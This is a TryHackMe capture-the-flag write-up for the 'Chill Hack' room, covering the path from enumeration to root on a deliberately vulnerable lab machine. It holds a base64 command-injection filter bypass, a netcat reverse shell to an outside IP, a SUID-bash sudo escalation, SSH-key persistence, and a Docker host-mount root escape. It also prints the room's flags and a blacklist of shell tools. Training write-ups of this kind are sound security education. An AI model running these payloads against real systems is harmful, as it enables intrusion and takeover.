# 🧊 Chill Hack: Easy

### TryHackMe Writeup

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)](https://tryhackme.com)
[![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)](https://tryhackme.com)
[![Type](https://img.shields.io/badge/Type-Linux-informational?style=for-the-badge&logo=linux)](https://tryhackme.com)

---

## 📋 Overview

| Field | Details |
|---|---|
| **Target** | `chill.thm` |
| **OS** | Ubuntu 20.04 |
| **Attack Surface** | Command injection w/ blacklist bypass, steganography, Docker group abuse |
| **Privesc** | sudo script injection → SUID bash → Docker container mount |

Chill Hack chains an anonymous FTP leak into a command injection endpoint with a weak blacklist, pivots through credential reuse across SSH, MySQL, and a hidden web portal, extracts a steganographically hidden password inside a JPEG, and finally achieves root via Docker group membership and a container host mount.

---

## 🔍 Enumeration

### Port Scan

```bash
sudo nmap -sC -sV -p- -vv -T4 chill.thm -oA chill-tcp-scan
sudo nmap -sU -p- -vv -T4 chill.thm -oA chill-udp-scan
```

```
21/tcp  open  vsftpd 3.0.5    — anonymous login allowed
22/tcp  open  OpenSSH 8.2p1
80/tcp  open  Apache 2.4.41
```

### FTP — Anonymous Login

```bash
ftp chill.thm
# login: anonymous / (blank)
get note.txt
```

```
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

Intel drop: there's a command execution endpoint somewhere with a blacklist. Two usernames identified: `Apaar` and `Anurodh`.

### Directory Bruteforce

```bash
ffuf -u http://chill.thm/FUZZ -w ./Web-Content/raft-medium-directories.txt -ic
```

Notable hit: `/secret/` — a command execution form.

---

## 💀 Initial Access — Command Injection + Blacklist Bypass

### The Blacklist

The `/secret/` endpoint runs `shell_exec()` on user input, but filters on a hardcoded word array split by spaces:

```php
$blacklist = array('nc', 'python', 'bash','php','perl','rm','cat','head','tail','python3','more','less','sh','ls');
```

The filter is trivially bypassed — it only checks exact token matches after a space split. Base64-encoding the payload and piping through `base64 -d | sh` routes around it entirely since neither `base64`, `sh` (as a pipe target), nor the encoded string matches any blacklisted token.

### Bypass

```
command=echo <base64_payload>|base64 -d|sh
```

Verified execution with `ls` (base64-encoded):

```bash
echo bHM=|base64 -d|sh
# → images index.php
```

### Reverse Shell

Encoded a mkfifo netcat reverse shell, sent it the same way:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.240.231 4444 >/tmp/f
```

```bash
# listener
nc -lvnp 4444
```

Shell caught as `www-data`.

### Shell Stabilisation

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# ctrl+z
stty raw -echo; fg
stty rows 44 cols 112
export TERM=xterm
```

---

## 🔁 Privilege Escalation — www-data → apaar

### sudo Misconfiguration

```bash
sudo -l
# (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```

The script passes user input directly into a variable without sanitisation. Running it under `apaar`'s context and injecting `/bin/bash -p` as the message drops a bash shell as `apaar`. The cleaner approach — copy bash and SUID it:

```bash
sudo -u apaar /home/apaar/.helpline.sh
# Enter person: a
# Enter message: cp /bin/bash . && chmod +s bash
```

```bash
./bash -p
# bash-5.0$ whoami
# apaar
```

### User Flag

```
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
```

### Persistence

Dropped an SSH public key into `apaar`'s `authorized_keys` for stable access:

```bash
echo 'ssh-ed25519 <pubkey>' >> /home/apaar/.ssh/authorized_keys
ssh apaar@chill.thm
```

---

## 🔁 Lateral Movement — apaar → anurodh

### Hidden Internal Service

```bash
ss -ntl
# 127.0.0.1:9001  — not exposed externally
```

```bash
curl http://localhost:9001
# Customer Portal login form
```

### Database Credentials

Source of the portal app revealed hardcoded DB credentials:

```
mysql:dbname=webportal;host=localhost  →  root / !@m+her00+@db
```

```bash
mysql -h localhost -u root -p
```

```sql
SELECT user_login, user_pass, user_nicename FROM users;
-- Aurick    | 7e53614ced3640d5de23f111806cc4fd  → masterpassword
-- cullapaar | 686216240e5af30df0501e53c789a649  → dontaskdonttell
```

### Steganography

The portal's `hacker.php` page displayed a JPEG. Downloaded it via the SSH tunnel:

```bash
wget http://localhost:9001/images/hacker-with-laptop_23-2147985341.jpg
steghide extract -sf hacker-with-laptop_23-2147985341.jpg
# passphrase: (blank)
# → backup.zip extracted
```

```bash
zip2john backup.zip > backup.hash
john backup.hash --wordlist=/usr/share/wordlists/rockyou.txt
# pass1word
```

`backup.zip` contained `source_code.php` with a base64-encoded password for `anurodh`:

```bash
echo IWQwbnRLbjB3bVlwQHNzdzByZA== | base64 -d
# !d0ntKn0wmYp@ssw0rd
```

```bash
su anurodh
# password: !d0ntKn0wmYp@ssw0rd
```

---

## 🔁 Privilege Escalation — anurodh → root

### Docker Group Abuse

```bash
id
# groups=1002(anurodh),999(docker)
```

Docker group membership is equivalent to root. Spun up an Alpine container with the host filesystem bind-mounted and chrooted into it:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```

```bash
cat /root/proof.txt
# {ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}
```

---

## 🗺️ Attack Chain

```
[Anonymous FTP]
    note.txt → blacklist hint + usernames (Apaar, Anurodh)
          │
          ▼
[Command Injection — /secret/]
    base64 pipe bypass → reverse shell → www-data
          │
          ▼
[sudo Misconfiguration]
    NOPASSWD .helpline.sh → script injection → SUID bash → apaar
          │
          ▼
[Internal Port 9001]
    MySQL creds in source → DB dump → MD5 hashes cracked
    JPEG steghide → backup.zip → source_code.php → base64 password → anurodh
          │
          ▼
[Docker Group]
    alpine container + host bind mount + chroot → root
```

---

## 📌 Key Takeaways

- Blacklist-based command filtering is security theatre — encoding or indirect execution bypasses it trivially
- Hardcoded database credentials in app source code are a direct path to credential reuse across the entire environment
- Docker group membership is a de facto root grant — treat it as such in any audit
- Internal-only services (`ss -ntl`) are often less hardened than externally exposed ones; always enumerate after gaining a foothold
- Credential reuse across SSH, MySQL, and web portals is endemic — always try cracked hashes everywhere

---

## 🎯 MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Initial Access | Exploit Public-Facing Application | [T1190](https://attack.mitre.org/techniques/T1190) |
| Defense Evasion | Obfuscated Files or Information | [T1027](https://attack.mitre.org/techniques/T1027) |
| Credential Access | Unsecured Credentials: Credentials In Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001) |
| Privilege Escalation | Abuse Elevation Control Mechanism: Sudo and Sudo Caching | [T1548.003](https://attack.mitre.org/techniques/T1548/003) |
| Privilege Escalation | Escape to Host | [T1611](https://attack.mitre.org/techniques/T1611) |

---

## 🛠️ Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | Port and service enumeration |
| `ftp` | Anonymous login, retrieve note.txt |
| `ffuf` | Directory bruteforce to discover /secret/ |
| `nc` | Reverse shell listener |
| `python3` | Shell stabilisation (pty.spawn) |
| `mysql` | Database credential enumeration |
| `steghide` | Extract backup.zip from JPEG |
| `zip2john` | Extract hash from encrypted zip |
| `john` | Crack zip passphrase |
| `ssh` | Persistent access via injected public key |
| `docker` | Alpine container with host bind mount for root flag |

## 🚩 Flags

| Flag | Value |
| --- | --- |
| `user.txt` | `{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}` |
| `root.txt` | `{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}` |
